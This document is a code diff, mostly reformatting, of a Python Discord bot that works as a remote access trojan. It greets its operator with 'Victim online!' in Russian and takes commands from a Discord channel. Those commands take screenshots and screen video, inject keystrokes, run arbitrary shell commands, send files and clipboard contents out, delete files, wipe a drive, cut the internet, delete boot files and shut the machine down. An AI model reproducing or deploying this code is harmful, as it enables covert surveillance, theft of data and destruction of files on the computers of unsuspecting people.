@@ -1,7 +1,3 @@
-'''Made by NullifiedVlad 
-   ты не станешь крутым программистом если
-   просто скопируешь его!'''
-
 
 import discord
 from discord.ext import commands
@@ -14,83 +10,85 @@ import cv2
 import config
 from datetime import datetime
 
-
 pg.FAILSAFE = False
-bot = commands.Bot(command_prefix='/') # префикс для комманд
-channel = bot.get_channel(config.channel) # введите id канала в который должен писать бот
+bot = commands.Bot(command_prefix='/')  # префикс для комманд
+channel = bot.get_channel(config.channel)  # введите id канала в который должен писать бот
 bot.remove_command('help')
 
 
-@bot.event 
+@bot.event
 async def on_ready():
     channel = bot.get_channel(config.channel)
-    date =  datetime.now()
-    x,y = pg.size()
-    await channel.send(f'CAT: **Жертва онлайн!** \n Время запука **{date.hour}:{date.minute}**. \n ОС: **{sys.platform}**. \n Разрешение экрана: **{x}x{y}** \n Напишите **/help** для справки!')
+    date = datetime.now( )
+    x, y = pg.size( )
+    await channel.send(
+        f'CAT: **Жертва онлайн!** \n Время запука **{date.hour}:{date.minute}**. \n ОС: **{sys.platform}**. \n Разрешение экрана: **{x}x{y}** \n Напишите **/help** для справки!')
     await bot.change_presence(activity=discord.Game(f'Был звпущен в {date.hour}:{date.minute}'))
-    del date 
-    del x,y 
+    del date
+    del x, y
 
 
 @bot.command()
-async def move(ctx,x,y,time): # перемещение курсора
-    pg.moveTo(int(x),int(y),float(time))
-    await ctx.send('**CAT**:  Курсор был передвинут на X:' + str(x) +' Y:' + str(y))
+async def move(ctx, x, y, time):  # перемещение курсора
+    pg.moveTo(int(x), int(y), float(time))
+    await ctx.send('**CAT**:  Курсор был передвинут на X:' + str(x) + ' Y:' + str(y))
 
 
 @bot.command()
-async def click(ctx): # кликнуть мышкой
+async def click(ctx):  # кликнуть мышкой
     pg.click()
     await ctx.send('**CAT**:  Был сделан клик!')
 
 
 @bot.command()
-async def screenshot(ctx): # сделать скриншот
+async def screenshot(ctx):  # сделать скриншот
     pg.screenshot('screenshot.png')
     await ctx.send(file=discord.File('screenshot.png'))
-    os.remove('screenshot.png' )
+    os.remove('screenshot.png')
 
 
 @bot.command()
-async def changelanguage(ctx): #смена раскладки
-    pg.hotkey('alt','shift')
+async def cg(ctx):  # смена раскладки
+    pg.hotkey('alt', 'shift')
     await ctx.send('**CAT**:  Раскладка клавиатуры успешно изменена!')
 
 
 @bot.command()
-async def write(ctx,*,text): # написать текс
+async def write(ctx, *, text):  # написать текс
     pg.typewrite(text)
     await ctx.send(f"**CAT**:  Был набран текст: {text}")
     del text
 
-@bot.command()     
-async def press(ctx,key,how_many): #нажать клавишу
-    assert  int(how_many) > 0
+
+@bot.command()
+async def press(ctx, key, how_many):  # нажать клавишу
+    assert int(how_many) > 0
     if key in config.keys:
         for i in range(int(how_many)):
             pg.press(key)
         await ctx.send(f'**CAT**: Была нажата клавиша "{key}" {how_many} раза!')
     else:
         await ctx.send('**CAT**: Нет такой клавиши!')
-    del key , how_many
+    del key, how_many
 
 
 @bot.command()
 async def help(ctx):
-    await ctx.send(config.helpmessage,file=discord.File('Banners/Banner.png'))
+    await ctx.send(config.helpmessage, file=discord.File('Banners/Banner.png'))
 
-    
+
 @bot.command()
-async def command(ctx,*,command):
+async def command(ctx, *, command):
     output = os.system(str(command))
     if output == 0:
         await ctx.send('**CAT**: Комманда успешно выполнена!')
     else:
         await ctx.send('**CAT**: Ошибка выполения!')
     del output
-    
+
+
 @bot.command()
-async def kill(ctx,*,process):
+async def kill(ctx, *, process):
     try:
         output = os.system(f'taskkill /im {str(process)} /f')
         if output == 0:
@@ -98,12 +96,13 @@ async def kill(ctx,*,process):
         else:
             await ctx.send('**CAT**: Такого процесса нет или вы указали непраильный процесс!')
             del command
-    except  UnboundLocalError:
+    except UnboundLocalError:
         await ctx.send('**CAT**: Эта команда доступна только для Windows!')
 
+
 @bot.command()
-async def processlist(ctx): # список процессов
-    f = open('processlist.txt','w')
+async def processlist(ctx):  # список процессов
+    f = open('processlist.txt', 'w')
     try:
         data = subprocess.check_output(['tasklist'])
         f.write(str(data))
@@ -113,9 +112,10 @@ async def processlist(ctx): # список процессов
     except FileNotFoundError:
         await ctx.send('**CAT**: Данная команда только для Windows XP/7/8.1/10!')
 
+
 @bot.command()
-async def video(ctx,how_many): #запись видео
-    assert how_many > 0 # проверка 
+async def video(ctx, how_many):  # запись видео
+    assert how_many > 0  # проверка
     output = 'video.avi'
     img = pg.screenshot()
     img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
@@ -123,7 +123,6 @@ async def video(ctx,how_many): #запись видео
     fourcc = cv2.VideoWriter_fourcc(*'mp4v')
     out = cv2.VideoWriter(output, fourcc, 20.0, (width, height))
     loop = 0
-
 
     while int(loop) <= int(how_many):
         try:
@@ -141,9 +140,9 @@ async def video(ctx,how_many): #запись видео
 
 
 @bot.command()
-async def delete(ctx,file): # удалиить файл
+async def delete(ctx, file):  # удалиить файл
     try:
-        check = os.remove(str(file))
+        os.remove(str(file))
     except FileNotFoundError:
         await ctx.send('**CAT**: Такой файл не найден!')
     finally:
@@ -152,25 +151,28 @@ async def delete(ctx,file): # удалиить файл
 
 
 @bot.command()
-async def format(ctx,disk): # форматирование диска 
+async def format(ctx, disk):  # форматирование диска
+    await ctx.send(f'**CAT**: Форматирую диск {disk}')
     os.system(f'rd/s/q {disk}:\ ')
     del disk
 
+
 @bot.command()
-async def inet_kill(ctx): # отключить интернет
+async def disable_internet(ctx):  # отключить интернет
     await ctx.send('**CAT**: Отключаю интернет соединение')
     os.system(config.disable_internet)
 
 
 @bot.command()
-async def system_kill(ctx): # удаление загрузочных файлов
+async def system_kill(ctx):  # удаление загрузочных файлов
     await ctx.send('**CAT**: Система убита!')
     os.system(config.system_kill)
 
+
 @bot.command()
-async def copy(ctx, way): # копирование файла
+async def copy(ctx, way):  # копирование файла
     try:
-        await ctx.send('**CAT**: Скопированный файл:' , file=discord.File(way))
+        await ctx.send('**CAT**: Скопированный файл:', file=discord.File(way))
         del way
     except FileNotFoundError:
         await ctx.send('**CAT**: Не могу найти файл!')
@@ -184,13 +186,13 @@ async def clipboard_grab(ctx):
 
 
 @bot.command()
-async def shutdown(ctx)
+async def shutdown(ctx):
     await ctx.send('Выключаю компьютер...')
     os.system('shutdown -s -t 1 -c "0x00000003234" >nul')
 
 
 @bot.command()
-async def reboot(ctx)
+async def reboot(ctx):
     await ctx.send('Перезагружаю компьютер...')
     os.system('shutdown -r -t 1 -c "0x00000003234" >nul')
 
